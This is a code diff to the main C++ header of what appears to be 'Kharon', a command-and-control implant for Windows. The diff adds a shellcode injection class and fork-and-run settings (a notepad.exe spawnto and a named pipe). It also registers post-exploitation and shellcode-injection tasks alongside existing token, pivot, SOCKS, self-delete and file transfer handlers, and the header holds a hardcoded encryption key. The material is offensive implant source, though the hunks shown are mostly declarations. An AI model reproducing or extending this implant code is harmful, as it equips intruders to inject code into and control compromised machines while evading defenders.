@@ -45,7 +45,9 @@ EXTERN_C UPTR EndPtr();
 #define PROFILE_WEB 0x25
 
 #define KH_JOB_TERMINATE  0x010
+#define KH_JOB_READY_SEND 0x050
 #define KH_JOB_SUSPENDED  0x100
+#define KH_JOB_HIBERN     0x150
 #define KH_JOB_RUNNING    0x200
 #define KH_JOB_PRE_START  0x300
 
@@ -103,6 +105,14 @@ EXTERN_C UPTR EndPtr();
 #ifndef KH_INJECTION_SC
 #define KH_INJECTION_SC ScClassic
 #endif // KH_INJECTION_SC
+
+#ifndef KH_SPAWNTO_X64
+#define KH_SPAWNTO_X64 "C:\\Windows\\System32\\notepad.exe"
+#endif // KH_SPAWNTO_X64
+
+#ifndef KH_FORK_PIPE_NAME
+#define KH_FORK_PIPE_NAME "\\\\.\\pipe\\kharon_pipe"
+#endif // KH_FORK_PIPE_NAME
 
 #ifndef KH_CRYPT_KEY
 #define KH_CRYPT_KEY { 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50 }
@@ -188,6 +198,7 @@ class Task;
 class Thread;
 class Process;
 class Heap;
+class Injection;
 class Library;
 class Transport;
 class Token;
@@ -213,13 +224,6 @@ typedef struct {
 typedef struct JOBS {
     PPACKAGE Pkg;
     PPARSER  Psr;
-
-    struct {
-        ULONG  ID;
-        HANDLE Handle;
-    } Thread;
-
-    BOOL     Threaded;
     ULONG    State;
     ULONG    ExitCode;
     PCHAR    UUID;
@@ -237,27 +241,23 @@ namespace Root {
         Coff*      Cf;
         Spoof*     Spf;
         Syscall*   Sys;
-        Socket*    Sckt;
+        Socket*    Skt;
         Jobs*      Jbs;
         Useful*    Usf;
         Library*   Lib;
         Token*     Tkn;
+        Task*      Tsk;
+        Injection* Inj;
         Heap*      Hp;
         Process*   Ps;
         Thread*    Td;
         Memory*    Mm;
-        Task*      Tk;
         Transport* Tsp;
         Mask*      Mk;
         Parser*    Psr;
         Package*   Pkg;
     
         UINT8 KH_SYSCALL_FLAGS = SYSCALL_FLAGS;
-
-        struct {
-            ULONG Alloc;
-            ULONG Write;
-        } Inj;
 
         struct {
             ULONG AllocGran;
@@ -456,6 +456,7 @@ namespace Root {
             DECLAPI( TerminateThread );
             DECLAPI( TerminateProcess );
             DECLAPI( OpenThread );
+            DECLAPI( SuspendThread );
             DECLAPI( ResumeThread );
             DECLAPI( CreateThread );
             DECLAPI( CreateRemoteThread );
@@ -563,6 +564,7 @@ namespace Root {
             RSL_TYPE( TerminateThread ),
             RSL_TYPE( TerminateProcess ),
             RSL_TYPE( OpenThread ),
+            RSL_TYPE( SuspendThread ),
             RSL_TYPE( ResumeThread ),
             RSL_TYPE( CreateThread ),
             RSL_TYPE( CreateRemoteThread ),
@@ -912,10 +914,6 @@ namespace Root {
             RSL_TYPE( InternetCloseHandle ),
         };
 
-        struct {
-
-        } Winhttp = {};
-
         explicit Kharon();
 
         auto Init(
@@ -926,11 +924,12 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitInject( Injection* InjRf ) { Inj = InjRf; }
         VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
         VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
-        VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
+        VOID InitSocket( Socket* SocketRf ) { Skt = SocketRf; }
         VOID InitJobs( Jobs* JobsRf ) { Jbs = JobsRf; }
         VOID InitUseful( Useful* UsefulRf ) { Usf = UsefulRf; }
         VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
@@ -938,7 +937,7 @@ namespace Root {
         VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
         VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
         VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
-        VOID InitTask( Task* TaskRf ) { Tk = TaskRf; }
+        VOID InitTask( Task* TaskRf ) { Tsk = TaskRf; }
         VOID InitTransport( Transport* TransportRf ) { Tsp = TransportRf; }
         VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
         VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
@@ -1552,13 +1551,6 @@ public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto ValidGranMem( ULONG GranCount ) -> PVOID;
-  
-    auto Xor( 
-        _In_opt_ BYTE*  Bin, 
-        _In_     SIZE_T BinSize, 
-        _In_     BYTE*  Key, 
-        _In_     SIZE_T KeySize 
-    ) -> VOID;
 
     auto CfgAddrAdd( 
         _In_ PVOID ImageBase,
@@ -1640,6 +1632,13 @@ public:
         _In_ ULONG Type
     ) -> BOOL;
 
+    auto FmtMsg(
+        _In_ CHAR* UUID,
+        _In_ ULONG Type,
+        _In_ CHAR* Message,
+        ...    
+    ) -> BOOL;
+    
     auto SendMsg(
         _In_ CHAR* UUID,
         _In_ CHAR* Message,
@@ -1946,6 +1945,33 @@ public:
     ) -> VOID;
 };
 
+class Injection {
+private:
+    Root::Kharon* Self;
+public:
+    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    struct {
+        ULONG Write;
+        ULONG Alloc;
+    } Ctx;
+
+    struct {
+        INJ_OBJ* Object;
+        HANDLE   ReadHandle;
+        HANDLE   WriteHandle;
+    } Node[15];
+
+    auto Standard(
+        _In_    BYTE*    Buffer,
+        _In_    SIZE_T   Size,
+        _In_    BYTE*    ArgBuff,
+        _In_    SIZE_T   ArgSize,
+        _In_    CHAR*    TaskUUID,
+        _Inout_ INJ_OBJ* Object
+    ) -> BOOL;    
+};
+
 class Task {
 private:
     Root::Kharon* Self;
@@ -1956,7 +1982,15 @@ public:
         VOID 
     ) -> VOID;
 
+    auto ScInject(
+        _In_ JOBS* Job
+    ) -> ERROR_CODE;
+
     auto Token(
+        _In_ JOBS* Job
+    ) -> ERROR_CODE;
+
+    auto PostEx(
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
@@ -2006,17 +2040,19 @@ public:
         ULONG        ID;
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
-        Mgmt[0].ID  = Enm::Task::Exit,       Mgmt[0].Run = &Task::Exit,
-        Mgmt[1].ID  = Enm::Task::FileSystem, Mgmt[1].Run = &Task::FileSystem,
-        Mgmt[2].ID  = Enm::Task::Process,    Mgmt[2].Run = &Task::Process,
-        Mgmt[3].ID  = Enm::Task::ExecBof,    Mgmt[3].Run = &Task::ExecBof,
-        Mgmt[4].ID  = Enm::Task::Config,     Mgmt[4].Run = &Task::Config,
-        Mgmt[5].ID  = Enm::Task::Download,   Mgmt[5].Run = &Task::Download,
-        Mgmt[6].ID  = Enm::Task::Upload,     Mgmt[6].Run = &Task::Upload,
-        Mgmt[7].ID  = Enm::Task::Socks,      Mgmt[7].Run = &Task::Socks,
-        Mgmt[8].ID  = Enm::Task::Token,      Mgmt[8].Run = &Task::Token,
-        Mgmt[9].ID  = Enm::Task::Pivot,      Mgmt[9].Run = &Task::Pivot,
-        Mgmt[10].ID = Enm::Task::SelfDelete, Mgmt[9].Run = &Task::SelfDel
+        Mgmt[0].ID  = Enm::Task::Exit,       Mgmt[0].Run  = &Task::Exit,
+        Mgmt[1].ID  = Enm::Task::FileSystem, Mgmt[1].Run  = &Task::FileSystem,
+        Mgmt[2].ID  = Enm::Task::Process,    Mgmt[2].Run  = &Task::Process,
+        Mgmt[3].ID  = Enm::Task::ExecBof,    Mgmt[3].Run  = &Task::ExecBof,
+        Mgmt[4].ID  = Enm::Task::Config,     Mgmt[4].Run  = &Task::Config,
+        Mgmt[5].ID  = Enm::Task::Download,   Mgmt[5].Run  = &Task::Download,
+        Mgmt[6].ID  = Enm::Task::Upload,     Mgmt[6].Run  = &Task::Upload,
+        Mgmt[7].ID  = Enm::Task::Socks,      Mgmt[7].Run  = &Task::Socks,
+        Mgmt[8].ID  = Enm::Task::Token,      Mgmt[8].Run  = &Task::Token,
+        Mgmt[9].ID  = Enm::Task::Pivot,      Mgmt[9].Run  = &Task::Pivot,
+        Mgmt[10].ID = Enm::Task::SelfDelete, Mgmt[10].Run = &Task::SelfDel,
+        Mgmt[11].ID = Enm::Task::PostEx,     Mgmt[11].Run = &Task::PostEx,
+        Mgmt[12].ID = Enm::Task::ScInject,   Mgmt[12].Run = &Task::ScInject
     };
 };
 
@@ -2034,13 +2070,17 @@ public:
     struct {
         ULONG ParentID;
         BOOL  BlockDlls;
-        PCHAR CurrentDir;
+        CHAR* CurrentDir;
+        CHAR* Spawnto;
         BOOL  Pipe;
+        CHAR* ForkPipe;
     } Ctx = {
         .ParentID   = 0,
         .BlockDlls  = FALSE,
         .CurrentDir = nullptr,
-        .Pipe       = TRUE
+        .Spawnto    = KH_SPAWNTO_X64,
+        .Pipe       = TRUE,
+        .ForkPipe   = KH_FORK_PIPE_NAME
     };
 
     auto Open(
@@ -2062,12 +2102,12 @@ class Thread {
 public:
     Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto Thread::GetCtx(
+    auto GetCtx(
         HANDLE   Handle,
         CONTEXT* Ctx
     ) -> BOOL;
 
-    auto Thread::SetCtx(
+    auto SetCtx(
         HANDLE   Handle,
         CONTEXT* Ctx
     ) -> BOOL;
